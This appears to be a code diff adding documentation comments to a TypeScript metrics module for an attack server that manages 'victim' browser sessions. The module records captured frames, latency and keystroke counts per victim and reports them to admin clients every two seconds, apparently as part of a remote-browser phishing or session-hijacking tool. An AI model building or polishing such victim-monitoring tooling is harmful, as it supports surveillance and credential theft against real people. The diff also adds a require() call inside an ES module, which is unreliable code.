@@ -1,37 +1,105 @@
 import { memoryUsage, cpus } from 'os';
 import type { BrowserInstance } from './types.js';
 
-// ─── State ────────────────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════
+// Module State
+// ═══════════════════════════════════════════════════════════════════════════════
 
+/**
+ * Server start timestamp (milliseconds since epoch).
+ * Used to calculate uptime.
+ */
 const serverStartTime = Date.now();
+
+/**
+ * Last CPU usage measurement.
+ * Used to calculate CPU percentage between measurements.
+ */
 let lastCpuUsage = process.cpuUsage();
+
+/**
+ * Timestamp of last CPU usage check (milliseconds since epoch).
+ * Used to calculate time delta for CPU percentage.
+ */
 let lastCpuCheck = Date.now();
 
-// Per-victim metrics tracking
+/**
+ * Per-victim metrics storage.
+ * Maps browser ID to metrics tracking object.
+ */
 const victimMetrics = new Map<string, VictimMetrics>();
 
+/**
+ * Internal metrics tracking structure for each victim.
+ */
 interface VictimMetrics {
+  /** Total number of frames captured */
   frameCount: number;
+  
+  /** Timestamp of last frame (milliseconds since epoch) */
   lastFrameTime: number;
-  frameTimestamps: number[]; // Last 30 frames for FPS calculation
+  
+  /** Timestamps of last 30 frames for FPS calculation */
+  frameTimestamps: number[];
+  
+  /** Sum of all frame latencies (for average calculation) */
   latencySum: number;
+  
+  /** Number of latency measurements */
   latencyCount: number;
+  
+  /** Total number of keystrokes recorded */
   keystrokeCount: number;
 }
 
-// ─── System Metrics ───────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════
+// System Metrics
+// ═══════════════════════════════════════════════════════════════════════════════
 
+/**
+ * System-wide metrics payload structure.
+ * Sent to admin clients every 2 seconds.
+ */
 export interface SystemMetrics {
+  /** Number of currently active victim sessions */
   activeVictims: number;
+  
+  /** Maximum concurrent victims allowed */
   maxVictims: number;
+  
+  /** Server uptime in seconds */
   uptimeSeconds: number;
+  
+  /** Current memory usage in MB */
   memoryUsageMB: number;
+  
+  /** Total system memory in MB */
   memoryTotalMB: number;
+  
+  /** Memory usage as percentage (0-100) */
   memoryPercent: number;
+  
+  /** CPU usage as percentage (0-100) */
   cpuPercent: number;
+  
+  /** Total number of sessions started today */
   totalSessionsToday: number;
 }
 
+/**
+ * Collects and returns system-wide metrics.
+ * 
+ * **Metrics Included:**
+ * - Active victim count
+ * - Server uptime
+ * - Memory usage (RSS - Resident Set Size)
+ * - CPU usage percentage
+ * - Daily session count
+ * 
+ * @param activeInstances - Array of all active browser instances
+ * @param maxVictims - Maximum concurrent victims allowed
+ * @returns System metrics object
+ */
 export function getSystemMetrics(
   activeInstances: BrowserInstance[],
   maxVictims: number,
@@ -53,17 +121,46 @@ export function getSystemMetrics(
   };
 }
 
-// ─── Per-Victim Metrics ───────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════
+// Per-Victim Metrics
+// ═══════════════════════════════════════════════════════════════════════════════
 
+/**
+ * Per-victim metrics payload structure.
+ * Sent to admin clients every 2 seconds for each active victim.
+ */
 export interface VictimMetricsData {
+  /** Browser instance ID */
   browserId: string;
+  
+  /** Session duration in seconds */
   sessionDurationSeconds: number;
+  
+  /** Current frames per second (calculated from last 30 frames) */
   currentFPS: number;
+  
+  /** Average frame latency in milliseconds */
   averageLatencyMs: number;
+  
+  /** Total number of keystrokes recorded */
   keystrokeCount: number;
+  
+  /** Memory usage for this browser context in MB (currently unused) */
   memoryUsageMB: number;
 }
 
+/**
+ * Collects and returns metrics for a specific victim.
+ * 
+ * **Metrics Included:**
+ * - Session duration (time since connection)
+ * - Current FPS (calculated from last 30 frames)
+ * - Average frame latency
+ * - Keystroke count
+ * 
+ * @param instance - Browser instance to collect metrics for
+ * @returns Victim metrics object
+ */
 export function getVictimMetrics(instance: BrowserInstance): VictimMetricsData {
   const metrics = victimMetrics.get(instance.id);
   
@@ -82,12 +179,22 @@ export function getVictimMetrics(instance: BrowserInstance): VictimMetricsData {
     currentFPS: fps,
     averageLatencyMs: avgLatency,
     keystrokeCount: metrics?.keystrokeCount ?? 0,
-    memoryUsageMB: 0, // Will be populated if we add per-context memory tracking
+    memoryUsageMB: 0, // TODO: Add per-context memory tracking if needed
   };
 }
 
-// ─── Metric Recording ─────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════
+// Metric Recording Functions
+// ═══════════════════════════════════════════════════════════════════════════════
 
+/**
+ * Records a frame capture event for FPS calculation.
+ * 
+ * Maintains a sliding window of the last 30 frame timestamps
+ * for accurate FPS calculation.
+ * 
+ * @param browserId - Browser instance ID
+ */
 export function recordFrame(browserId: string): void {
   let metrics = victimMetrics.get(browserId);
   if (!metrics) {
@@ -106,7 +213,7 @@ export function recordFrame(browserId: string): void {
   metrics.frameCount++;
   metrics.frameTimestamps.push(now);
   
-  // Keep only last 30 frames for FPS calculation
+  // Keep only last 30 frames for FPS calculation (sliding window)
   if (metrics.frameTimestamps.length > 30) {
     metrics.frameTimestamps.shift();
   }
@@ -114,6 +221,15 @@ export function recordFrame(browserId: string): void {
   metrics.lastFrameTime = now;
 }
 
+/**
+ * Records a frame latency measurement.
+ * 
+ * Latency is the time between frame capture and frame delivery.
+ * Used to calculate average latency for performance monitoring.
+ * 
+ * @param browserId - Browser instance ID
+ * @param latencyMs - Latency in milliseconds
+ */
 export function recordLatency(browserId: string, latencyMs: number): void {
   const metrics = victimMetrics.get(browserId);
   if (!metrics) return;
@@ -122,6 +238,14 @@ export function recordLatency(browserId: string, latencyMs: number): void {
   metrics.latencyCount++;
 }
 
+/**
+ * Records a keystroke event.
+ * 
+ * Increments the keystroke counter for the victim.
+ * Used for activity monitoring and session analysis.
+ * 
+ * @param browserId - Browser instance ID
+ */
 export function recordKeystroke(browserId: string): void {
   const metrics = victimMetrics.get(browserId);
   if (!metrics) return;
@@ -129,12 +253,32 @@ export function recordKeystroke(browserId: string): void {
   metrics.keystrokeCount++;
 }
 
+/**
+ * Clears all metrics for a victim.
+ * 
+ * Called when a victim disconnects to free memory.
+ * 
+ * @param browserId - Browser instance ID
+ */
 export function clearVictimMetrics(browserId: string): void {
   victimMetrics.delete(browserId);
 }
 
-// ─── Internal Helpers ─────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════
+// Internal Helper Functions
+// ═══════════════════════════════════════════════════════════════════════════════
 
+/**
+ * Calculates frames per second from a list of frame timestamps.
+ * 
+ * **Algorithm:**
+ * - Takes timestamps of last N frames (up to 30)
+ * - Calculates time span from first to last frame
+ * - Divides frame count by time span to get FPS
+ * 
+ * @param timestamps - Array of frame timestamps (milliseconds since epoch)
+ * @returns Frames per second (rounded to nearest integer)
+ */
 function calculateFPS(timestamps: number[]): number {
   if (timestamps.length < 2) return 0;
   
@@ -145,12 +289,26 @@ function calculateFPS(timestamps: number[]): number {
   return Math.round(fps);
 }
 
+/**
+ * Calculates CPU usage percentage since last check.
+ * 
+ * **Algorithm:**
+ * - Uses Node.js process.cpuUsage() to get user + system CPU time
+ * - Calculates delta since last measurement
+ * - Converts to percentage based on elapsed wall-clock time
+ * 
+ * **Note:** Returns 0 if called too frequently (< 100ms between calls)
+ * to avoid inaccurate measurements.
+ * 
+ * @returns CPU usage percentage (0-100)
+ */
 function getCpuUsagePercent(): number {
   const now = Date.now();
   const currentUsage = process.cpuUsage();
   const timeDiff = now - lastCpuCheck;
   
-  if (timeDiff < 100) return 0; // Too soon to measure
+  // Too soon to measure accurately
+  if (timeDiff < 100) return 0;
   
   const userDiff = currentUsage.user - lastCpuUsage.user;
   const systemDiff = currentUsage.system - lastCpuUsage.system;
@@ -165,16 +323,36 @@ function getCpuUsagePercent(): number {
   return Math.round(Math.min(cpuPercent, 100));
 }
 
+/**
+ * Gets total system memory in bytes.
+ * 
+ * Uses Node.js built-in os.totalmem() for accurate system memory.
+ * 
+ * @returns Total system memory in bytes
+ */
 function getTotalSystemMemory(): number {
-  const cpuList = cpus();
-  // Rough estimate: assume 2GB per CPU core as baseline
-  // This is a fallback; in production you'd use os.totalmem() but it's not available in all environments
-  return cpuList.length * 2 * 1024 * 1024 * 1024;
+  // Use Node.js built-in to get actual system memory
+  return require('os').totalmem();
 }
 
+/**
+ * Session count for today.
+ * Reset at midnight (based on ISO date string comparison).
+ */
 let sessionCountToday = 0;
+
+/**
+ * Date of last session count (ISO date string: YYYY-MM-DD).
+ * Used to detect day rollover and reset counter.
+ */
 let lastSessionCountDate = new Date().toISOString().slice(0, 10);
 
+/**
+ * Increments the daily session counter.
+ * 
+ * Automatically resets counter at midnight (day rollover).
+ * Called when a new victim connects.
+ */
 export function incrementSessionCount(): void {
   const today = new Date().toISOString().slice(0, 10);
   if (today !== lastSessionCountDate) {
@@ -184,6 +362,14 @@ export function incrementSessionCount(): void {
   sessionCountToday++;
 }
 
+/**
+ * Gets the number of sessions started today.
+ * 
+ * Returns 0 if called on a different day than last increment
+ * (handles server running across midnight).
+ * 
+ * @returns Number of sessions started today
+ */
 function getTodaySessionCount(): number {
   const today = new Date().toISOString().slice(0, 10);
   if (today !== lastSessionCountDate) {
